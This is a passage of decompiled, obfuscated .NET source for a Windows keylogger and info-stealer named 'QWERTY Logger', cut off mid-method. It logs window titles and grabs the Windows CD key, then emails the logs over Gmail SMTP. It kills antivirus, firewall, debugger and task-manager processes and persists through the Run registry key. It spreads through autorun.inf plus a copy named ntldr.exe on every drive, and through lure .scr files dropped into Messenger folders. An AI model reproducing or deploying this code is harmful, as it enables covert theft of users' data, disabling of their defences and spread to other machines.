        num3 = 13;
        this.Jje3WLD2TX = Strings.Space(checked ((int) FileSystem.LOF(1)));
        goto label_234;
label_239:
        this.BIYaksaUXR = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_240:
        num3 = 12;
        goto label_236;
label_241:
        if (false)
        {
          if ((uint) flag < 0U)
          {
            if ((uint) num2 + (uint) num3 >= 0U)
              goto label_247;
            else
              goto label_246;
          }
          else
            goto label_248;
        }
        else
          goto label_223;
label_244:
        num3 = 10;
        this.fazEqHLo8Y = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_245:
        num3 = 11;
        if ((uint) num3 <= uint.MaxValue)
          goto label_239;
label_246:
        this.n01ypBQrhK = Strings.Space(checked ((int) FileSystem.LOF(1)));
        goto label_244;
label_247:
        num3 = 9;
        goto label_246;
label_248:
        this.CMoPfL3l2I = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_249:
        num3 = 8;
        this.b4d8hOGWIz = Strings.Space(checked ((int) FileSystem.LOF(1)));
        if ((uint) flag - (uint) num2 <= uint.MaxValue)
          goto label_247;
        else
          goto label_239;
label_250:
        if (((flag ? 1 : 0) | (int) byte.MaxValue) == 0)
          goto label_153;
        else
          goto label_248;
label_252:
        num3 = 7;
        if ((uint) num3 + (uint) num3 <= uint.MaxValue)
          goto label_250;
label_253:
        num3 = 6;
        if (true)
        {
          this.zNYN2apmvZ = Strings.Space(checked ((int) FileSystem.LOF(1)));
          goto label_252;
        }
        else
          goto label_110;
label_255:
        num3 = 5;
        if ((num1 & 0) == 0)
        {
          this.nie9zcYPUv = Strings.Space(checked ((int) FileSystem.LOF(1)));
          if ((uint) num3 + (uint) num3 <= uint.MaxValue)
            goto label_260;
          else
            goto label_258;
        }
        else
          goto label_82;
label_256:
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        goto label_255;
label_257:
        num3 = 4;
        goto label_256;
label_258:
        num3 = 3;
        this.Visible = false;
        goto label_257;
label_260:
        if (((flag ? 1 : 0) & 0) == 0)
          goto label_253;
        else
          goto label_250;
label_261:
        num3 = 2;
        this.Timer2.Start();
        if (true)
        {
          if ((num3 & 0) == 0)
            goto label_258;
          else
            goto label_260;
        }
        else
          goto label_225;
label_262:
        if (false)
          goto label_80;
label_263:
        this.TextBox6.Text = "==================================================" + this.nl + "Windows CD Key : " + this.TNLgi4bBsY() + this.nl + "==================================================";
        goto label_261;
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
label_266:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
      return;
label_267:
      throw ProjectData.CreateProjectError(-2146828237);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      MailMessage message = new MailMessage();
      message.Subject = "QWERTY Logger Logs - " + MyProject.Computer.Name;
      do
      {
        if (false)
          goto label_3;
        else
          goto label_5;
label_1:
        this.TextBox1.Clear();
        continue;
label_3:
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
        smtpClient.Port = 587;
        if (true)
        {
          smtpClient.EnableSsl = true;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text);
          smtpClient.Send(message);
          goto label_1;
        }
        else
          goto label_1;
label_5:
        message.To.Add(this.TextBox2.Text);
        message.From = new MailAddress(this.TextBox2.Text);
        message.Body = "- QWERTY Logger Logs -" + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + this.nl + " - Stealers - " + this.nl + this.nl + this.textbox5.Text + this.TextBox6.Text;
        if (false)
          goto label_1;
        else
          goto label_3;
      }
      while (false);
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      bool flag = Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) != 0;
      if (false)
      {
        if (true)
          goto label_3;
      }
      else
        goto label_7;
label_2:
      if ((uint) flag - (uint) flag >= 0U && (uint) flag - (uint) flag >= 0U)
        return;
label_3:
      if (!flag)
        return;
      this.TextBox1.Text = this.TextBox1.Text + "\r\n[" + this.GetActiveWindowTitle() + "]:\r\n";
      this.strin = this.GetActiveWindowTitle();
      goto label_2;
label_7:
      if (((flag ? 1 : 0) | 15) != 0)
        goto label_3;
    }

    public void DZW52XDOGM()
    {
      Process[] processes = Process.GetProcesses();
label_8:
      do
      {
        int num1 = checked (processes.Length - 1);
        int index = 0;
        if ((uint) index < 0U)
          goto label_6;
label_2:
        int num2 = index;
        int num3 = num1;
        int num4 = num3;
        if (num2 > num4)
          continue;
        string Left = Strings.LCase(processes[index].ProcessName);
        if ((uint) index >= 0U)
          goto label_6;
        else
          goto label_5;
label_4:
        do
        {
          checked { ++index; }
          if ((uint) num1 + (uint) num1 > uint.MaxValue)
            goto label_8;
        }
        while ((uint) num1 - (uint) num1 < 0U);
        goto label_2;
label_5:
        processes[index].Kill();
        goto label_4;
label_6:
        bool flag = Operators.CompareString(Left, "keyscrambler", false) == 0;
        if ((uint) num3 < 0U || !flag)
          goto label_4;
        else
          goto label_5;
      }
      while (false);
    }

    public void GQTo1p4vOS()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      if ((uint) num1 < 0U)
      {
        if ((num1 & 0) == 0)
          goto label_6;
        else
          goto label_5;
      }
      else
        goto label_13;
label_3:
      int index;
      int num2 = index;
      int num3;
      int num4 = num3;
      int num5 = num4;
      bool flag;
      string Left;
      if (num2 > num5)
      {
        if ((uint) flag + (uint) index <= uint.MaxValue)
          return;
        goto label_6;
      }
      else
      {
        Left = Strings.LCase(processes[index].ProcessName);
        goto label_10;
      }
label_5:
      if (flag)
      {
        processes[index].Kill();
        if ((uint) index < 0U)
          return;
      }
label_6:
      do
      {
        checked { ++index; }
      }
      while ((uint) num3 + (uint) num3 < 0U);
      if ((num4 & 0) == 0)
      {
        if ((uint) index > uint.MaxValue || (uint) flag >= 0U)
          goto label_3;
      }
      else
        goto label_5;
label_10:
      flag = Operators.CompareString(Left, "wireshark", false) == 0;
      goto label_5;
label_13:
      if (true)
      {
        num3 = checked (processes.Length - 1);
        index = 0;
        goto label_3;
      }
      else
        goto label_6;
    }

    public void bycTYHBI2Q()
    {
      Process[] processes = Process.GetProcesses();
      bool flag1;
      int num1;
      if ((uint) flag1 - (uint) num1 >= 0U)
        goto label_9;
label_1:
      int index;
      checked { ++index; }
label_2:
      int num2 = index;
      int num3;
      int num4 = num3;
      int num5 = num4;
      if (num2 > num5)
        return;
      string Left = Strings.LCase(processes[index].ProcessName);
      if ((uint) index >= 0U)
        goto label_8;
label_5:
      bool flag2;
      while (!flag2)
      {
        if ((uint) index - (uint) num3 <= uint.MaxValue)
        {
          if ((uint) num4 + (uint) num3 <= uint.MaxValue)
            goto label_1;
        }
        else
          goto label_9;
      }
      processes[index].Kill();
      goto label_1;
label_8:
      flag2 = Operators.CompareString(Left, "anubis", false) == 0;
      if ((uint) index + (uint) index >= 0U)
        goto label_5;
label_9:
      num3 = checked (processes.Length - 1);
      index = 0;
      goto label_2;
    }

    public void cVM42NzSZ1()
    {
      Process[] processes = Process.GetProcesses();
label_13:
      int num1 = checked (processes.Length - 1);
      int index = 0;
      int num2;
      if ((uint) num2 + (uint) index < 0U)
        goto label_14;
label_3:
      int num3 = index;
      num2 = num1;
      int num4 = num2;
      if (num3 > num4)
        return;
      bool flag = Operators.CompareString(Strings.LCase(processes[index].ProcessName), "mbam", false) == 0;
label_14:
      if ((uint) num1 >= 0U)
        goto label_10;
      else
        goto label_15;
label_1:
label_2:
      checked { ++index; }
      goto label_3;
label_4:
      if ((uint) flag - (uint) flag >= 0U)
        goto label_1;
label_6:
      if (flag)
        goto label_9;
      else
        goto label_1;
label_8:
      if (false)
        goto label_10;
      else
        goto label_4;
label_9:
      processes[index].Kill();
      goto label_2;
label_10:
      if ((uint) num1 < 0U)
      {
        if ((num2 | -1) == 0)
          goto label_8;
      }
      else
        goto label_6;
label_15:
      if ((uint) num2 - (uint) flag > uint.MaxValue)
      {
        if ((uint) num1 < 0U)
        {
          if ((uint) index < 0U)
            goto label_4;
          else
            goto label_4;
        }
        else if ((uint) num2 + (uint) num1 < 0U)
          goto label_13;
        else
          goto label_8;
      }
      else
        goto label_9;
    }

    public void JnuvQY5BtG()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      int num2;
      do
      {
        num1 = checked (processes.Length - 1);
        int index = 0;
label_10:
        bool flag;
        if ((uint) index - (uint) flag >= 0U)
          goto label_3;
label_2:
        checked { ++index; }
label_3:
        int num3 = index;
        num2 = num1;
        int num4 = num2;
        if (num3 <= num4)
          goto label_11;
        else
          goto label_5;
label_1:
        goto label_2;
label_5:
        if ((uint) flag > uint.MaxValue)
        {
          if ((uint) flag - (uint) index <= uint.MaxValue)
            goto label_1;
        }
        else
          continue;
label_8:
        processes[index].Kill();
        if (((flag ? 1 : 0) & 0) == 0)
        {
          if (false)
            goto label_1;
          else
            goto label_2;
        }
        else
          goto label_10;
label_11:
        flag = Operators.CompareString(Strings.LCase(processes[index].ProcessName), "avp", false) == 0;
        if (true)
        {
          if (((flag ? 1 : 0) | 8) != 0 && !flag)
          {
            if ((num2 | 15) != 0)
              goto label_1;
            else
              goto label_5;
          }
          else
            goto label_8;
        }
        else
          goto label_10;
      }
      while ((uint) num1 - (uint) num2 < 0U);
    }

    public void cyJQDvfLat()
    {
      Process[] processes = Process.GetProcesses();
      int num1 = checked (processes.Length - 1);
      int index = 0;
      int num2;
      bool flag;
      do
      {
        int num3 = index;
        num2 = num1;
        int num4 = num2;
        if (num3 <= num4)
        {
          string Left = Strings.LCase(processes[index].ProcessName);
          do
          {
            flag = Operators.CompareString(Left, "ollydbg", false) == 0;
          }
          while ((num2 | 2) == 0);
          if ((uint) flag + (uint) num1 >= 0U)
          {
label_5:
            if (flag)
              goto label_7;
            else
              goto label_4;
label_3:
            checked { ++index; }
            if ((uint) num1 >= 0U)
              continue;
label_4:
            if (true)
            {
              if ((uint) num1 - (uint) num1 < 0U)
                continue;
              goto label_3;
            }
            else
              goto label_5;
label_7:
            processes[index].Kill();
            goto label_3;
          }
        }
      }
      while ((uint) num2 + (uint) flag > uint.MaxValue);
    }

    public void ou4vyjeHZ5()
    {
      Process[] processes = Process.GetProcesses();
label_10:
      int num1;
      bool flag;
      do
      {
        num1 = checked (processes.Length - 1);
        int index = 0;
        int num2;
        do
        {
          int num3 = index;
          num2 = num1;
          int num4 = num2;
          if (num3 <= num4)
          {
            flag = Operators.CompareString(Strings.LCase(processes[index].ProcessName), "outpost", false) == 0;
            if ((uint) index - (uint) flag < 0U || flag)
              goto label_7;
            else
              goto label_5;
label_2:
            if ((uint) num1 + (uint) num1 < 0U)
              goto label_10;
            else
              goto label_6;
label_3:
            checked { ++index; }
            goto label_2;
label_5:
            if ((uint) index >= 0U)
            {
              if ((index | 4) == 0 || true)
                goto label_3;
              else
                goto label_2;
            }
label_6:
            continue;
label_7:
            processes[index].Kill();
            if ((uint) flag + (uint) num1 > uint.MaxValue)
              goto label_3;
            else
              goto label_3;
          }
          else
            break;
        }
        while ((uint) num2 - (uint) num1 >= 0U);
      }
      while ((uint) flag - (uint) num1 > uint.MaxValue);
    }

    public void tyk3DbFSW2()
    {
      Process[] processes = Process.GetProcesses();
      int num1 = checked (processes.Length - 1);
      int index = 0;
      bool flag1;
      int num2;
      if ((uint) flag1 + (uint) num2 <= uint.MaxValue)
        goto label_8;
      else
        goto label_6;
label_2:
      int num3 = index;
      int num4 = num1;
      int num5 = num4;
      if (num3 > num5)
        return;
      string Left = Strings.LCase(processes[index].ProcessName);
label_6:
      bool flag2;
      do
      {
        flag2 = Operators.CompareString(Left, "npfmsg", false) == 0;
        if (!flag2)
        {
          if ((uint) index > uint.MaxValue)
            goto label_4;
        }
        else
          goto label_7;
      }
      while (((flag2 ? 1 : 0) | 3) == 0);
label_1:
      do
      {
        checked { ++index; }
      }
      while ((uint) flag2 + (uint) index < 0U);
      goto label_2;
label_4:
      processes[index].Kill();
      goto label_1;
label_7:
      if ((uint) num1 + (uint) num4 <= uint.MaxValue)
        goto label_4;
      else
        goto label_1;
label_8:
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_2;
      else
        goto label_2;
    }

    public void rgJKZqyGzS()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      int num2;
      if ((uint) num1 + (uint) num2 >= 0U)
        goto label_16;
label_2:
      int index;
      checked { ++index; }
label_3:
      int num3;
      bool flag;
      do
      {
        int num4 = index;
        int num5 = num3;
        int num6 = num5;
        if (num4 > num6)
        {
          if (true)
            goto label_17;
          else
            break;
        }
        else
        {
          string Left = Strings.LCase(processes[index].ProcessName);
          if ((uint) index >= 0U)
            goto label_13;
          else
            goto label_15;
label_12:
          processes[index].Kill();
          continue;
label_13:
          flag = Operators.CompareString(Left, "bdagent", false) == 0;
          do
          {
            do
            {
              if (!flag)
              {
                if ((uint) num3 + (uint) num3 <= uint.MaxValue)
                  goto label_1;
              }
              else
                goto label_12;
            }
            while (false);
            if ((uint) num5 <= uint.MaxValue)
            {
              if ((uint) flag + (uint) index > uint.MaxValue)
                goto label_13;
            }
            else
              break;
          }
          while (true);
          goto label_1;
label_15:
          if ((uint) num3 - (uint) num3 >= 0U)
          {
            if ((uint) index + (uint) num5 > uint.MaxValue)
              goto label_16;
            else
              goto label_12;
          }
          else
            break;
        }
      }
      while ((uint) flag < 0U);
      goto label_2;
label_1:
      goto label_2;
label_17:
      return;
label_16:
      num3 = checked (processes.Length - 1);
      index = 0;
      goto label_3;
    }

    public void X1iu1aUhYb()
    {
      Process[] processes = Process.GetProcesses();
      int num1;
      if ((uint) num1 > uint.MaxValue)
        goto label_5;
      else
        goto label_14;
label_1:
      int index;
      int num2 = index;
      int num3;
      int num4 = num3;
      int num5 = num4;
      bool flag;
      if (num2 <= num5)
      {
        string Left = Strings.LCase(processes[index].ProcessName);
        if ((uint) num3 - (uint) flag >= 0U)
        {
          if ((uint) index - (uint) flag <= uint.MaxValue)
          {
            flag = Operators.CompareString(Left, "egui", false) == 0;
            if ((uint) num4 + (uint) num4 > uint.MaxValue)
              goto label_9;
          }
          if ((uint) num4 + (uint) num4 >= 0U)
            goto label_5;
        }
        else
          goto label_5;
      }
      else
        goto label_4;
label_3:
      checked { ++index; }
      if (((flag ? 1 : 0) | int.MinValue) != 0)
        goto label_1;
label_4:
      if ((uint) num3 + (uint) index <= uint.MaxValue)
        return;
      goto label_9;
label_5:
      if (!flag)
      {
        if ((uint) flag + (uint) num4 > uint.MaxValue)
          goto label_1;
        else
          goto label_3;
      }
      else
      {
        processes[index].Kill();
        goto label_3;
      }
label_9:
      num3 = checked (processes.Length - 1);
      index = 0;
      goto label_1;
label_14:
      int num6;
      if ((uint) num6 - (uint) num6 <= uint.MaxValue)
        goto label_9;
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      this.bycTYHBI2Q();
      if (false)
      {
        if (true)
          goto label_6;
      }
      else
        goto label_11;
label_3:
      this.tyk3DbFSW2();
      this.cyJQDvfLat();
label_4:
      this.ou4vyjeHZ5();
      if (true)
      {
        this.GQTo1p4vOS();
        if (false)
          goto label_3;
      }
      if (true)
      {
        if (true)
          return;
        if (true)
          goto label_11;
        else
          goto label_9;
      }
label_6:
      this.X1iu1aUhYb();
      if (false)
        goto label_4;
      else
        goto label_3;
label_9:
      this.cVM42NzSZ1();
      goto label_6;
label_11:
      if (false)
        ;
      this.rgJKZqyGzS();
      if (true)
      {
        this.JnuvQY5BtG();
        this.DZW52XDOGM();
        if (true)
          goto label_9;
        else
          goto label_6;
      }
      else
        goto label_3;
    }

    public static void AddStartup(string Name, string Path)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (false)
        return;
      registryKey.SetValue(Name, (object) Path, RegistryValueKind.String);
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      this.yE4QX1sJ4w();
      this.kI3nd1sdmfh093HGSDAAdfwe2();
    }

    public void yE4QX1sJ4w()
    {
      Process[] processes = Process.GetProcesses();
      int index;
      int num1;
      bool flag1;
      while ((uint) num1 - (uint) flag1 >= 0U)
      {
        num1 = checked (processes.Length - 1);
        index = 0;
        if ((uint) num1 > uint.MaxValue)
          return;
        if (true)
          goto label_2;
      }
      goto label_6;
label_1:
      checked { ++index; }
label_2:
      int num2;
      string Left;
      do
      {
        int num3 = index;
        num2 = num1;
        int num4 = num2;
        if (num3 <= num4)
        {
          Left = Strings.LCase(processes[index].ProcessName);
          if (false)
            goto label_4;
        }
        else
          goto label_10;
      }
      while ((uint) index - (uint) index < 0U);
      goto label_6;
label_10:
      return;
label_4:
      processes[index].Kill();
      goto label_1;
label_6:
      bool flag2 = Operators.CompareString(Left, "taskmgr", false) == 0;
      if (!flag2)
      {
        if ((uint) flag2 + (uint) num2 >= 0U)
          goto label_1;
      }
      else
        goto label_4;
    }

    public void kI3nd1sdmfh093HGSDAAdfwe2()
    {
      Process[] processes = Process.GetProcesses();
      if (true)
        goto label_8;
      else
        goto label_4;
label_1:
      int index;
      int num;
      if (index > num)
        return;
      if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "Anvir", false) == 0)
      {
        processes[index].Kill();
        goto label_3;
      }
label_2:
label_3:
      checked { ++index; }
      goto label_1;
label_4:
      bool flag;
      if ((uint) flag - (uint) flag < 0U)
        goto label_3;
      else
        goto label_2;
label_8:
      num = checked (processes.Length - 1);
      index = 0;
      goto label_1;
    }

    public void ujks27DFHJKkjhga129374HGFDAKJHGASD8723GFhdagsjegf2173()
    {
      try
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        if (true)
          goto label_21;
label_2:
label_3:
        int index;
        string[] logicalDrives;
        bool flag1 = index < logicalDrives.Length;
        if (!flag1)
          return;
        string str = logicalDrives[index];
        if ((uint) index - (uint) flag1 <= uint.MaxValue)
          goto label_18;
        else
          goto label_16;
label_5:
        System.IO.File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
        System.IO.File.SetAttributes(str + "ntldr.exe", FileAttributes.Hidden);
        if ((uint) flag1 >= 0U)
          goto label_12;
        else
          goto label_9;
label_6:
        if ((uint) index - (uint) flag1 > uint.MaxValue)
          goto label_11;
        else
          goto label_5;
label_9:
        StreamWriter streamWriter;
        streamWriter.WriteLine("[autorun]");
        streamWriter.WriteLine("open = ntldr.exe");
        if (true)
        {
          if ((uint) index + (uint) flag1 >= 0U)
          {
            if ((uint) index + (uint) flag1 >= 0U)
            {
              streamWriter.WriteLine("shellexecute=ntldr.exe");
              streamWriter.Close();
              goto label_6;
            }
          }
          else
            goto label_12;
        }
        else
          goto label_3;
label_11:
        streamWriter = new StreamWriter(str + "autorun.inf");
        if (true)
          goto label_9;
label_12:
        if ((uint) index - (uint) index <= uint.MaxValue)
        {
          checked { ++index; }
          if (false)
            goto label_5;
          else
            goto label_2;
        }
        else
          goto label_2;
label_14:
        if (!flag1)
        {
          if ((uint) flag1 - (uint) flag1 < 0U)
            goto label_6;
          else
            goto label_11;
        }
        else
        {
          System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, str + "ntldr.exe");
          if ((uint) index + (uint) index < 0U)
            goto label_18;
        }
label_16:
        if ((uint) flag1 < 0U)
          ;
        if ((uint) index + (uint) index > uint.MaxValue)
          goto label_14;
        else
          goto label_11;
label_18:
        flag1 = !System.IO.File.Exists(str + "ntldr.exe");
        if (((flag1 ? 1 : 0) & 0) != 0)
          goto label_3;
        else
          goto label_14;
label_21:
        logicalDrives = Directory.GetLogicalDrives();
        int num;
        bool flag2;
        if ((uint) num + (uint) flag2 >= 0U)
        {
          index = 0;
          goto label_3;
        }
        else
          goto label_3;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void KDDhsgd23943173GAJgf239047dsjkg()
    {
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, this.LimePfad + "windows_7full.scr");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, Interaction.Environ("programfiles\\Shared\\" + "windows_7full.scr"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void lud283aH2082bca2G32SDV()
    {
      try
      {
        Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
        if (true)
          Dns.GetHostEntry("workgroup");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, "workgroup");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void IKjsd2933214j1()
    {
label_1:
      int num1;
      int num2;
      bool flag1;
      int index;
      int upperBound;
      try
      {
        ProjectData.ClearProjectError();
label_43:
        if ((num2 & 0) == 0)
          goto label_44;
label_2:
        switch (num1 <= -2 ? 1 : num1)
        {
          case 1:
            int num3 = num2 + 1;
            num2 = 0;
            switch (num3)
            {
              case 0:
                goto label_54;
              case 1:
                goto label_1;
              case 2:
                goto label_42;
              case 3:
                goto label_41;
              case 4:
                goto label_40;
              case 5:
                goto label_38;
              case 6:
                goto label_37;
              case 7:
                goto label_31;
              case 8:
                goto label_30;
              case 9:
                goto label_29;
              case 10:
                goto label_25;
              case 11:
                goto label_22;
              case 12:
                goto label_16;
              case 13:
                goto label_14;
              case 14:
                goto label_9;
              case 15:
                break;
              case 16:
              case 17:
                goto label_51;
              default:
                if (true)
                  goto label_54;
                else
                  goto label_51;
            }
            break;
          default:
            goto label_54;
        }
label_7:
        int num4 = 15;
        checked { ++index; }
label_8:
        int num5 = index;
        int num6 = upperBound;
        int num7 = num6;
        if (num5 <= num7)
          goto label_25;
        else
          goto label_51;
label_9:
        int num8;
        if ((uint) index + (uint) num8 <= uint.MaxValue)
        {
          if ((uint) num1 <= uint.MaxValue)
          {
            if ((uint) num2 + (uint) num8 >= 0U)
              goto label_7;
            else
              goto label_51;
          }
          else
            goto label_13;
        }
label_12:
        if (flag1 || (uint) upperBound - (uint) flag1 < 0U)
          goto label_22;
        else
          goto label_9;
label_13:
        if ((uint) num8 <= uint.MaxValue)
        {
          if ((uint) upperBound + (uint) upperBound > uint.MaxValue)
            goto label_26;
          else
            goto label_9;
        }
        else
          goto label_12;
label_14:
        if (false)
          goto label_8;
        else
          goto label_13;
label_16:
        num4 = 12;
        string executablePath;
        string[] directories;
        if ((uint) num8 <= uint.MaxValue)
        {
          if ((uint) upperBound + (uint) flag1 >= 0U)
          {
            System.IO.File.Copy(executablePath, directories[index] + "\\mypornpics.scr");
            goto label_14;
          }
          else
            goto label_29;
        }
        else
          goto label_27;
label_19:
        bool flag2;
        if (true)
        {
          if (!flag2)
            goto label_14;
          else
            goto label_16;
        }
        else
          goto label_7;
label_22:
        num4 = 11;
        flag2 = !System.IO.File.Exists(directories[index] + "\\mypornpics.scr");
        if ((uint) flag2 + (uint) num8 >= 0U)
        {
          if ((uint) num2 + (uint) num8 > uint.MaxValue)
            goto label_8;
          else
            goto label_19;
        }
        else
          goto label_43;
label_23:
        flag1 = Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0;
        if (false)
          goto label_29;
        else
          goto label_12;
label_25:
        num4 = 10;
label_26:
        if ((uint) num2 + (uint) num8 > uint.MaxValue)
          goto label_54;
        else
          goto label_23;
label_27:
        upperBound = directories.GetUpperBound(0);
        index = 0;
        goto label_8;
label_29:
        num4 = 9;
        goto label_34;
label_30:
        num4 = 8;
        string str;
        if ((num1 & 0) == 0)
        {
          directories = Directory.GetDirectories(str);
          goto label_29;
        }
        else
          goto label_34;
label_31:
        num4 = 7;
        num8 = 0;
        if (false)
          goto label_36;
        else
          goto label_30;
label_32:
        if ((uint) num6 + (uint) flag1 <= uint.MaxValue)
        {
          index = 0;
          goto label_31;
        }
        else
          goto label_44;
label_34:
        if ((uint) flag1 < 0U)
        {
          if (true)
          {
            if (false)
              goto label_19;
            else
              goto label_25;
          }
          else
            goto label_23;
        }
        else
          goto label_27;
label_36:
        flag1 = Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) != 0;
        if ((uint) index >= 0U)
        {
          if (!flag1)
            goto label_51;
        }
label_37:
        num4 = 6;
        goto label_32;
label_38:
        num4 = 5;
        goto label_36;
label_40:
        num4 = 4;
        if ((uint) num4 - (uint) index >= 0U)
        {
          str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
          if ((uint) flag2 <= uint.MaxValue)
            goto label_38;
          else
            goto label_32;
        }
        else
          goto label_23;
label_41:
        num4 = 3;
        executablePath = Application.ExecutablePath;
        goto label_40;
label_42:
        num4 = 2;
        Module module = Assembly.GetExecutingAssembly().GetModules()[0];
        goto label_41;
label_44:
        num1 = -2;
        goto label_42;
label_3:
        num2 = num4;
        goto label_2;
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
label_51:
      do
      {
        if (num2 == 0)
        {
          if ((uint) upperBound - (uint) index <= uint.MaxValue)
            goto label_48;
        }
        else
          goto label_55;
label_49:
        if ((uint) flag1 <= uint.MaxValue)
          continue;
label_55:
        ProjectData.ClearProjectError();
        if ((upperBound | int.MaxValue) != 0)
          goto label_49;
        else
          goto label_52;
      }
      while ((num1 & 0) != 0);
      goto label_53;
label_48:
      return;
label_53:
      return;
label_52:
      return;
label_54:
      throw ProjectData.CreateProjectError(-2146828237);
    }

    public void askfuh129836jsa()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_40:
        int num3 = 2;
        Module module = Assembly.GetExecutingAssembly().GetModules()[0];
        goto label_38;
label_4:
        bool flag1;
        if (flag1)
          goto label_32;
label_5:
        bool flag2;
        if ((uint) num1 - (uint) flag2 >= 0U)
          goto label_12;
        else
          goto label_10;
label_6:
        int index;
        int num4 = index;
        int upperBound;
        int num5 = upperBound;
        int num6 = num5;
        if (num4 > num6)
        {
          if ((uint) num3 - (uint) num3 >= 0U)
          {
            if ((uint) flag1 + (uint) flag1 >= 0U)
              goto label_11;
            else
              goto label_10;
          }
          else
            goto label_21;
        }
        else
          goto label_22;
label_8:
        num3 = 15;
        checked { ++index; }
        goto label_6;
label_10:
        if ((uint) num3 + (uint) num2 <= uint.MaxValue)
          goto label_8;
label_11:
        if ((uint) flag2 + (uint) index >= 0U)
          goto label_5;
label_12:
        if (true)
          goto label_46;
label_13:
        if ((uint) num1 + (uint) index >= 0U)
          goto label_45;
        else
          goto label_32;
label_14:
        if (false)
          goto label_20;
label_15:
        if (((flag1 ? 1 : 0) & 0) != 0)
          goto label_14;
        else
          goto label_10;
label_18:
        num3 = 12;
        string executablePath;
        string[] directories;
        System.IO.File.Copy(executablePath, directories[index] + "\\ys.scr");
        goto label_20;
label_19:
        if ((uint) upperBound - (uint) flag1 >= 0U)
        {
          if (flag2)
            goto label_18;
          else
            goto label_14;
        }
        else
          goto label_29;
label_20:
        if ((uint) upperBound >= 0U)
        {
          if ((uint) num5 > uint.MaxValue)
            goto label_40;
          else
            goto label_14;
        }
        else
          goto label_10;
label_21:
        num3 = 11;
        flag2 = !System.IO.File.Exists(directories[index] + "\\ys.scr");
        goto label_25;
label_22:
        num3 = 10;
        flag1 = Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0;
        if (flag1)
        {
          if (true)
            goto label_21;
          else
            goto label_25;
        }
        else
          goto label_10;
label_23:
        num3 = 9;
        upperBound = directories.GetUpperBound(0);
        index = 0;
        goto label_6;
label_25:
        if (true)
          goto label_19;
        else
          goto label_29;
label_28:
        num3 = 8;
        string str;
        if (true)
        {
          directories = Directory.GetDirectories(str);
          if (((flag1 ? 1 : 0) | 1) != 0)
          {
            if ((uint) flag2 >= 0U)
            {
              if ((uint) num5 + (uint) index < 0U || (uint) flag2 - (uint) index >= 0U)
              {
                if ((uint) index - (uint) flag2 >= 0U)
                  goto label_23;
                else
                  goto label_19;
              }
              else
                goto label_15;
            }
            else
              goto label_35;
          }
        }
        else
          goto label_5;
label_29:
        num3 = 7;
        goto label_28;
label_32:
        num3 = 6;
        if ((upperBound | (int) byte.MaxValue) != 0)
        {
          index = 0;
          if ((num1 | 1) != 0)
            goto label_29;
          else
            goto label_19;
        }
        else
          goto label_37;
label_34:
        num3 = 5;
label_35:
        flag1 = Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) != 0;
        if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
          goto label_4;
        else
          goto label_38;
label_37:
        num3 = 4;
        str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
        goto label_39;
label_38:
        num3 = 3;
        if (true)
        {
          executablePath = Application.ExecutablePath;
          goto label_37;
        }
label_39:
        if (true)
          goto label_34;
        else
          goto label_4;
label_2:
        num2 = num3;
        switch ((uint) num1 - (uint) num1 < 0U || num1 <= -2 ? 1 : num1)
        {
          case 0:
            break;
          case 1:
            int num7 = num2 + 1;
            num2 = 0;
            switch (num7)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_40;
              case 3:
                goto label_38;
              case 4:
                goto label_37;
              case 5:
                goto label_34;
              case 6:
                goto label_32;
              case 7:
                goto label_29;
              case 8:
                goto label_28;
              case 9:
                goto label_23;
              case 10:
                goto label_22;
              case 11:
                goto label_21;
              case 12:
                goto label_18;
              case 13:
                goto label_14;
